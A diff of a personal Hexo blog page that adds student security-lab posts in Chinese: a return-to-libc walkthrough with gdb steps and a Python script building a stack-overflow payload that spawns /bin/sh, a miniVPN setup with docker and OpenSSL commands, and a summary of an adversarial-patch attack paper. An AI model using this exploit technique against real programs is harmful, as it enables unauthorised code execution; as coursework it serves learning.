@@ -9,13 +9,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
 <meta property="og:title" content="Imane&#39;s Blog">
-<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:url" content="https://imane219.github.io/project/index.html">
 <meta property="og:site_name" content="Imane&#39;s Blog">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="Imane">
 <meta name="twitter:card" content="summary">
   
-    <link rel="alternate" href="/atom.xml" title="Imane&#39;s Blog" type="application/atom+xml">
+    <link rel="alternate" href="/project/atom.xml" title="Imane&#39;s Blog" type="application/atom+xml">
   
   
     <link rel="icon" href="/favicon.png">
@@ -24,7 +24,7 @@
     <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
   
   
-<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/project/css/style.css">
 
 <meta name="generator" content="Hexo 5.4.0"></head>
 
@@ -36,7 +36,7 @@
   <div id="header-outer" class="outer">
     <div id="header-title" class="inner">
       <h1 id="logo-wrap">
-        <a href="/" id="logo">Imane&#39;s Blog</a>
+        <a href="/project/" id="logo">Imane&#39;s Blog</a>
       </h1>
       
     </div>
@@ -44,19 +44,23 @@
       <nav id="main-nav">
         <a id="main-nav-toggle" class="nav-icon"></a>
         
-          <a class="main-nav-link" href="/">Home</a>
+          <a class="main-nav-link" href="/project/">Home</a>
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+          <a class="main-nav-link" href="/project/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/project/categories">Categories</a>
+        
+          <a class="main-nav-link" href="/project/tags">Tags</a>
         
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/project/atom.xml" title="RSS Feed"></a>
         
         <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://Imane219.github.io/project"></form>
       </div>
     </div>
   </div>
@@ -64,12 +68,75 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-tmp" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2021/07/16/hello-world/" class="article-date">
-  <time datetime="2021-07-16T00:51:21.783Z" itemprop="datePublished">2021-07-16</time>
+    <a href="/project/2021/07/16/tmp/" class="article-date">
+  <time datetime="2021-07-16T01:29:21.380Z" itemprop="datePublished">2021-07-16</time>
 </a>
     
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ol>
+<li><p><strong>returntolibc步骤：</strong></p>
+<ol>
+<li><p>首先编译有漏洞的程序，编译的时候增加选项，打开不可执行栈，关闭stackguard，关闭地址随机化。命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z noexecstack -o stack returntolibc_stack.c</span><br><span class="line"><span class="meta">#</span><span class="bash">或者gcc -fno-stack-protector -z noexecstack -g -o s_gdb returntolibc_stack.c 编译生成可调试的s_gdb程序</span></span><br><span class="line">sudo sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure></li>
+<li><p>使用gdb调试s_gdb程序，并找到system函数和exit函数的地址，命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb ./s_gdb</span><br><span class="line">run</span><br><span class="line">p system</span><br><span class="line">p exit</span><br></pre></td></tr></table></figure>
+
+<p>结果如下图：</p>
+<p><img src="D:\0\blog\myblog\source_posts\信息系统安全\return2libc1.png"></p>
+</li>
+<li><p>使用断点功能找到进入后的ebp和buffer起始地址，计算出我们需要填充的参数的相对位置，使用<code>gdb ./s_gdb</code>进入可调试程序，使用<code>b vulfunc</code>设下断点，使用<code>run</code>执行程序到断点处停下，使用<code>p $ebp</code> <code>p &amp;buffer</code>来查看ebp寄存器中存的ebp的地址以及分配给buffer的首地址，两者相减得到33是栈中存ebp的地址块首地址到buffer首地址的距离。如下图所示：</p>
+<p><img src="D:\0\blog\myblog\source_posts\信息系统安全\return2libc4.png"></p>
+</li>
+<li><p>接着编写一个新的程序用来获取环境变量的地址，使用<code>gcc envraddr.c -o envraddr</code>编译它，使用<code>export MYSHELL=&quot;/bin/sh&quot;</code>将环境变量MYSHELL设置为”/bin/bash”字符串，使用<code>./envraddr</code>指令执行它。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="comment">//getenv用来获取MYSHELL环境变量的值（环境变量存的路径）和环境变量所在地址</span></span><br><span class="line">	<span class="keyword">char</span> *shell = (<span class="keyword">char</span> *)getenv(<span class="string">&quot;MYSHELL&quot;</span>);</span><br><span class="line">   	<span class="keyword">if</span>(shell)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;   Value: %s\n&quot;</span>, shell);</span><br><span class="line">   		<span class="built_in">printf</span>(<span class="string">&quot; Address: %x\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)shell);</span><br><span class="line">	&#125;</span><br><span class="line">   	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; MYSHELL not found\n&quot;</span>);</span><br><span class="line">   	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果如下图，可知我们环境变量的地址是0xbfffe18，也就是我们所需要的”/bin/sh”字符串的地址.</p>
+<p><img src="D:\0\blog\myblog\source_posts\信息系统安全\return2libc2.png"></p>
+</li>
+<li><p>接下来需要将相关参数填充栈，从ebp依次栈底填充的内容是：system的地址、exit的地址、”/bin/sh”字符串的地址。编写python脚本实现这个功能：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with none zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>))</span><br><span class="line"></span><br><span class="line">a3 = <span class="number">0xb7ec582b</span> <span class="comment"># address of &quot;/bin/sh&quot;</span></span><br><span class="line">content[<span class="number">45</span>:<span class="number">49</span>] = (a3).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a2 = <span class="number">0xb7d989d0</span> <span class="comment"># address of exit()</span></span><br><span class="line">content[<span class="number">41</span>:<span class="number">45</span>] = (a2).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a1 = <span class="number">0xb7da4da0</span> <span class="comment"># address of system()</span></span><br><span class="line">content[<span class="number">37</span>:<span class="number">41</span>] = (a1).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">file.write(content)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure></li>
+<li><p>最后我们执行python脚本就可以把恶意输入填充到badfile里，接着运行我们有漏洞的程序就可以实现攻击。</p>
+</li>
+<li><p>出现了一点问题，攻击没有反应，我们只能换个”/bin/sh”字符串地址来试试，我们尝试在gdb运行漏洞程序的时候（先在main函数处加断点，再run）加载在内存中查找字符串，使用命令<code>searchmem &quot;/bin/sh&quot;</code>，查找的结果如图所示，用新的地址替换python程序中的地址，再次尝试。</p>
+<p><img src="D:\0\blog\myblog\source_posts\信息系统安全\return2libc5.png"></p>
+</li>
+<li><p>终于成功了，结果如下，成功出现了新的shell输入端。</p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc6.png"></p>
+</li>
+</ol>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/07/16/tmp/" data-id="ckr5o9zyi000hxkuraatd4k0k" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-hexo使用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/07/16/hexo%E4%BD%BF%E7%94%A8/" class="article-date">
+  <time datetime="2021-07-16T01:29:21.339Z" itemprop="datePublished">2021-07-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/blog/">blog</a>
+  </div>
+
   </div>
   <div class="article-inner">
     
@@ -78,7 +145,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/16/hello-world/">Hello World</a>
+      <a class="article-title" href="/project/2021/07/16/hexo%E4%BD%BF%E7%94%A8/">hexo使用</a>
     </h1>
   
 
@@ -99,13 +166,876 @@
 <h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<h3 id="Normally-Deploy"><a href="#Normally-Deploy" class="headerlink" title="Normally Deploy"></a>Normally Deploy</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure>
+
+<p>or</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g -d</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/16/hello-world/" data-id="ckr5nkq9p0000osur9ydsemey" class="article-share-link">Share</a>
+      <a data-url="https://imane219.github.io/project/2021/07/16/hexo%E4%BD%BF%E7%94%A8/" data-id="ckr5o9zye0008xkurfr67hnm3" class="article-share-link">Share</a>
       
       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/blog/" rel="tag">blog</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-vpn" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/05/19/vpn/" class="article-date">
+  <time datetime="2021-05-19T11:56:01.000Z" itemprop="datePublished">2021-05-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/05/19/vpn/">miniVPN实现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-网络环境搭建"><a href="#1-网络环境搭建" class="headerlink" title="1.网络环境搭建"></a>1.网络环境搭建</h3><p>使用三个docker环境模拟三台主机，seedubuntu自身作为vpn服务器，vpn客户端和内网主机用容器。使用extranet模拟客户端和网关之间的外网，intranet模拟内网。</p>
+<p><img src="/vpn/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA1.png"></p>
+<p><strong>首先创建docker网络extranet和intranet</strong>，使用命令</p>
+<p><code>sudo docker network create --subnet=10.0.2.0/24 --gateway=10.0.2.8 --opt  &quot;com.docker.network.bridge.name&quot;=&quot;docker1&quot; extranet</code></p>
+<p>创建extranet的网段是10.0.2.0/24，网关的地址是10.0.2.8，接口的名称是docker1</p>
+<p>创建intranet的命令是</p>
+<p><code>sudo docker network create --subnet=192.168.60.0/24 --gateway=192.168.60.1 --opt &quot;com.docker.network.bridge.name&quot;=&quot;docker2&quot; intranet</code></p>
+<p>成功后在虚拟机输入<code>docker network ls</code>可以看到多出了extranet和intranet</p>
+<p><img src="/vpn/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA2.png"></p>
+<p><strong>接着开启两个新的终端，并创建容器HostU和HostV</strong>，使用命令</p>
+<p><code>sudo docker run -it --name=HostU --hostname=HostU --net=extranet --ip=10.0.2.7  --privileged &quot;seedubuntu&quot; /bin/bash</code></p>
+<p>指定该主机连接的网段是extranet，ip是10.0.2.7</p>
+<p>创建HostV的命令是<code>sudo docker run -it --name=HostV --hostname=HostV --net=intranet --ip=192.168.60.101 --privileged &quot;seedubuntu&quot; /bin/bash</code></p>
+<p>在两台主机上删除默认路由<code>route del default</code>，以免hostU能路由到hostV</p>
+<p>查看容器情况如图所示，容器ip均成功配置</p>
+<p><img src="/vpn/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA3.png"></p>
+<h3 id="2-创建VPN隧道"><a href="#2-创建VPN隧道" class="headerlink" title="2.创建VPN隧道"></a>2.创建VPN隧道</h3><p>TLS/SSL VPN 中使用了 TUN/TAP 技术，其在现代操作系统中已经广泛使用。TUN 和 TAP 是虚拟网络内核驱动程序；它们可以实现完全由软件支持的网络设备。TAP 模拟以太网设备，处理的是以太网帧等二层数据包；TUN 模拟网络层设备，处理的是 IP 等三层数据包。我们可以用 TAP/TUN 创建虚拟网络接口。</p>
+<p>如图虚线是隧道，vpn客户端和服务器程序可以使用TUN接口从主机获取ip数据包和发送ip数据包到主机。</p>
+<p><img src="/vpn/%E9%9A%A7%E9%81%931.png"></p>
+<p>当HostU需要往HostV发送数据包，应用层的程序首先将数据传递，IP报文会被路由到tun0接口，vpnclient程序这时就会从tun0读取报文，并进行加密等操作后，发送到物理网卡eth0，由eth0把他当作应用层数据再进行一次封装。当报文达到vpn网关时，网关的物理网卡会将其解封装，把加密的报文传给vpnserver程序，vpnserver程序会将其解密，然后传递给tun0，路由到docker2网卡，封装后明文发给HostV</p>
+<p><img src="/vpn/%E9%9A%A7%E9%81%932.png"></p>
+<p>首先我们需要打开tun接口，编写编译vpnclient和vpnserver程序，并把编译好的vpnclient程序放入HostU容器中，使用命令<code>sudo docker cp vpnclient HostU:/vpnclient</code>。接着在虚拟机中运行vpnserver（<code>./vpnserver</code>），在HostU中运行vpnclient(<code>./vpnclient 10.0.2.8</code>)，将tun0接口打开，但是我们还需要配置tun0接口，使用命令<code>sudo ifconfig tun0 192.168.53.5/24 up</code>，将HostU的tun0接口配置到192.168.53.5/24网段，如图所示，tun0接口有了自己的ip，且状态是up</p>
+<p><img src="/vpn/%E9%9A%A7%E9%81%933.png"></p>
+<p>同样在虚拟机（server）中也要配置tun0接口，命令是<code>sudo ifconfig tun0 192.168.53.1/24 up</code></p>
+<p>接着我们需要给HostU和HostV配置默认路由。让HostU发给HostV的报文经过tun0再往外面发送，命令<code> route add -net 192.168.60.0/24 tun0</code>；让HostV发给HostU的报文经过vpn server网关，命令<code>route add -net 192.168.53.0/24 gw 192.168.60.1</code>，其中53/24是HostU的tun0接口，gw是网关地址</p>
+<p>配置后查看路由表可以看到有了到192.168.60.0/24的路由</p>
+<p><img src="/vpn/%E9%9A%A7%E9%81%934.png"></p>
+<p>同时开启server机器的ip转发功能，<code>sudo sysctl net.ipv4.ip_forward=1</code>，并关闭可能阻断转发的iptables规则<code>sudo iptables -F</code></p>
+<p>现在两台主机已经可以通过隧道通信了，如图所示，HostV上的tcpdump也成功截获了报文。</p>
+<p><img src="/vpn/%E9%9A%A7%E9%81%935.png"></p>
+<p>在docker1（extranet）网段截包，可以看到HostU到vpn网关往来的udp报文，其中udp报文中的数据部分是一个ip报文，看到data中以4500开头可以知道是典型ipv4报文头部，而这个报文则会是内网通讯的报文。</p>
+<p><img src="/vpn/%E9%9A%A7%E9%81%936.png"></p>
+<p>在docker2（intranet）截包可以看到是网关和HostV之间用icmp报文通信，此时已经剥开了外面的隧道报文，用于内网通信。</p>
+<p><img src="/vpn/%E9%9A%A7%E9%81%937.png"></p>
+<h3 id="3-加密隧道"><a href="#3-加密隧道" class="headerlink" title="3.加密隧道"></a>3.加密隧道</h3><p>利用TLS加密机制加密套接字通信，将前面UDP套接字通信改成TCP。使用openssl创建TLS会话，代码见下一节</p>
+<h3 id="4-建立CA"><a href="#4-建立CA" class="headerlink" title="4.建立CA"></a>4.建立CA</h3><p>在建立VPN之前，VPN客户端必须对服务器进行身份认证，确保服务器的真实性；同样服务器也需要对客户端认证。典型的认证方法是使用公钥证书，VPN服务器首先从CA获取公钥证书，当客户端连接到VPN服务器时，服务器将使用证书来证明自己是真的服务器。</p>
+<p>我们首先基于OpenSSL<strong>创建CA</strong>，然后使用它给服务器和用户颁发证书。</p>
+<ol>
+<li><p>创建文件夹CA，并且将/usr/lib/ssl/openssl.cnf配置文件复制到CA文件夹中，按照配置文件中的说明创建多个子目录（CA default部分）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cp /usr/lib/ssl/openssl.cnf openssl.cnf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> demoCA</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir certs</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir crl</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> touch index.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir newcerts</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> 1000 &gt; serial</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vpn/ca1.png"></p>
+</li>
+<li><p>给CA 自己创建一个自签名证书，这意味着此CA完全可信，其证书将作为根证书。命令<code>openssl req -new -x509 -keyout ca.key -out ca.crt -config openssl.cnf</code>生成ca.key文件存储ca的私钥，ca.crt文件存储ca的公钥证书。执行命令时会让填写国家等基本信息，还有PEM密码（123456），以后每次签发证书的时候都需要输入此密码。</p>
+</li>
+<li><p>现在我们需要给服务器签发公钥证书，首先创造一对公私钥对，使用命令<code>openssl genrsa -des3 -out server.key 1024</code>，我们还需要自己输入密码保护这对公私钥（123456）；接着生成证书签名请求（CSR），CSR将发送给CA，CA将为密钥生成证书，命令<code>openssl req -new -key server.key -out server.csr -config openssl.cnf</code></p>
+</li>
+<li><p>使用相似的命令生成服务端的RSA密钥对和CSR<code>openssl genrsa -des3 -out client.key 1024</code>(pass phrase:123456) <code>openssl req -new -key client.key -out client.csr -config openssl.cnf</code></p>
+</li>
+<li><p>生成证书：CSR文件需要有CA的签名才能形成证书，服务器：<code>openssl ca -in server.csr -out server.crt -cert ca.crt -keyfile ca.key -config openssl.cnf</code>，客户端：<code>openssl ca -in client.csr -out client.crt -cert ca.crt -keyfile ca.key -config openssl.cnf</code></p>
+</li>
+</ol>
+<p><strong>创建CA方法2</strong>，使用上述方法签发证书会出现奇怪的bug，可以采用以下方法创建CA签发证书，用这种方法生成的证书并没有用到conf规定的目录，写程序的时候需要注意以下路径。</p>
+<ol>
+<li><p>生成签署CA证书</p>
+<p>生成CA私钥：<code>openssl genrsa -aes256 -out ca.key 2048</code></p>
+<p>生成CA证书签名请求（CSR）：<code>openssl req -new -sha256 -key ca.key -out ca.csr</code></p>
+<p>自签署证书：<code>openssl x509 -req -days 36500 -sha256 -extensions v3_ca -signkey ca.key -in ca.csr -out ca.crt</code></p>
+</li>
+<li><p>生成签署服务器证书</p>
+<p>生成服务器私钥：<code>openssl genrsa -aes256 -out server.key 2048</code></p>
+<p>生成服务器证书签名请求（CSR）：<code>openssl req -new -sha256 -key server.key -out server.csr</code></p>
+<p>签署服务器证书：<code>openssl x509 -req -days 36500 -sha256 -extensions v3_req  -CA  ca.crt -CAkey ca.key  -CAserial ca.srl  -CAcreateserial -in server.csr -out server.crt</code></p>
+</li>
+<li><p>生成签署客户端证书</p>
+<p>生成客户端私钥：<code>openssl genrsa -aes256 -out client.key 2048</code></p>
+<p>生成客户端证书签名请求（CSR）：<code>openssl req -new -sha256 -key client.key  -out client.csr</code></p>
+<p>签署客户端证书：<code>openssl x509 -req -days 36500 -sha256 -extensions v3_req  -CA  ca.crt -CAkey ca.key -CAserial ca.srl -CAcreateserial -in client.csr -out client.crt</code></p>
+</li>
+</ol>
+<h3 id="5-client程序编写"><a href="#5-client程序编写" class="headerlink" title="5.client程序编写"></a>5.client程序编写</h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/05/19/vpn/" data-id="ckr5o9zym000oxkur7axgaryc" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/vpn/" rel="tag">vpn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-安卓程序加密分析" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/05/18/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/" class="article-date">
+  <time datetime="2021-05-18T10:41:01.000Z" itemprop="datePublished">2021-05-18</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E5%AE%89%E5%8D%93/">安卓</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/05/18/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/">安卓程序加密算法及密钥生成过程分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/05/18/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/" data-id="ckr5o9zyr000uxkurhkyccmbi" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/android/" rel="tag">android</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/encryption/" rel="tag">encryption</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-ECCV2020" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/05/17/ECCV2020/" class="article-date">
+  <time datetime="2021-05-17T08:51:01.000Z" itemprop="datePublished">2021-05-17</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/">论文阅读</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/05/17/ECCV2020/">Bias-based Universal Adversarial Patch Attack for Automatic Check-out</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="ECCV2020-基于偏见（Bias）的通用对抗补丁生成框架"><a href="#ECCV2020-基于偏见（Bias）的通用对抗补丁生成框架" class="headerlink" title="[ECCV2020]基于偏见（Bias）的通用对抗补丁生成框架"></a>[ECCV2020]基于偏见（Bias）的通用对抗补丁生成框架</h2><blockquote>
+<p> 本文提出了基于偏置的对抗补丁生成框架，它所生成的补丁具有<b>跨类别攻击能力(class-agnostic)</b>和<b>跨模型攻击能力(universal)</b>，并且具有强大的<b>泛化能力(generalization ability)</b>。</p>
+</blockquote>
+<h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p><b>Automatic Check-Out(ACO)</b>是一种可视商品计数系统，它以商品图像作为输入，以不同类别的商品计数作为输出。它依赖于深度学习并广泛应用于生活中的自动结账系统。</p>
+<p>深度学习面对对抗样本时十分脆弱，一些微小的扰动对人眼来说不可察觉但却能极大的误导深度神经网络(DNN).除开精心设计的扰动外，<strong>对抗补丁</strong>也是生成对抗样本的一个可选项，它可以直接放置于输入图像之上，很方便地用于现实生活中的攻击。</p>
+<p>现有的策略生成的对抗补丁依赖于<strong>特定的输入</strong>，且不能对有<strong>所有类别</strong>的图片展开攻击。</p>
+<p>本文提出的框架利用感知和语义偏见解决了上述问题（见下段）。我们对数字世界和物理世界都进行了白盒和黑盒攻击实验，结果显示我们的框架优于目前最先进的对抗补丁生成思路，尤其可以对未知类别的输入进行有效的攻击。</p>
+<h3 id="二、提出的框架"><a href="#二、提出的框架" class="headerlink" title="二、提出的框架"></a>二、提出的框架</h3><p>整体框架如下图，分为两个部分：1.利用DNN模型固有的感知偏见从<strong>hard examples</strong>中提取<b>先验补丁(textural patch prior)</b>，并融合处理获得更好的泛化攻击能力。2.生成包含丰富语义信息的<b>类原型(prototypes)</b>帮助训练对抗补丁，以获得对抗补丁生成效率上的提升。</p>
+<p><img src="C:\Users\Imane\AppData\Roaming\Typora\typora-user-images\image-20210401225128011.png" alt="image-20210401225128011"></p>
+<ol>
+<li><p><strong>基于感知偏见的先验补丁生成(Perceptually Biased Prior Generation)</strong></p>
+<p><strong>hard examples：</strong> 指那些模型很难正确分辨的样本，它们接近模型的决策边界并且更容易跨越边界让模型识别错误，因此基于hard examples提取的特征训练我们的补丁会更有成效。</p>
+<p>而研究表明，DNN的判断更多的依赖于纹理信息(texture)（也被认为是模型的感知偏见），因此我们从多个不同种类的hard examples中提取纹理特征，并将他们融合成一个更强的先验补丁。</p>
+<p>然而仅仅在像素级别很难提取和融合纹理特征，我们引入<b>风格损失(style loss)</b>来处理它们：</p>
+<p>$$L_s = E_k[||G(x^*) - G(x_k^h)||_F^2]$$</p>
+<p>$$L_s = E_k[||G(x^*) - G(x_k^h)||<em>F^2],\G</em>{ij}(x) = \sum_{k}F_{ik}^l(x) \cdot F_{jk}^l(x)\G是从特定神经网络层提取出的特征Gram矩阵，F_{\cdot k}^l是l层k处的特定过滤器的激活\x^*是融合后的样本，x_k^h是k=1,2…r时的hard\ example$$</p>
+<p>此外我们引入<b>类不确性损失(class-wise uncertainty loss)</b>来提高对补丁不同类的泛化攻击能力，我们通过最小化负熵的方法增加模型的预测不确定性，这样的话我们的融合样本会更接近决策边界并获得对于不同类的低置信度。<br>$$<br>L_u = E_i[log\ y^{h,i}]\<br>y^{h,i}是模型在面对融合样本x^<em>时的第i个类的置信度<br>$$<br>整个融合损失函数优化如下：<br>$$<br>L_f = L_s + \lambda \cdot L_u\<br>\lambda控制两项的平衡<br>$$<br>此外我们引入<b>注意力模块(attention module)</b>来消除冗余像素，保持补丁的大小一致，并从融合样本中生成纹理先验。<br>$$<br>\delta^</em> = A(x^*;F)\<br>A(\cdot)是视觉注意力模块，用来从融合样本中选出合适的视觉像素\<br>\delta^<em>是纹理先验，x^</em>是融合样本，F是模型<br>$$<br>其中融合样本的每个像素权重计算如下：<br>$$<br>a_{ij} = \sum_{k=1}^{w}\frac{\partial{y^h}}{\partial{Z_{ij}^k}}Z_{ij}^k\<br>a_{ij}是像素点(i,j)处的权重，Z_{ij}^k是点(i,j)的第k个特征映射的像素值\<br>w是特征映射总数<br>$$</p>
+</li>
+<li><p><strong>基于语义偏见的类原型训练(Training with Semantically Biased Prototypes)</strong></p>
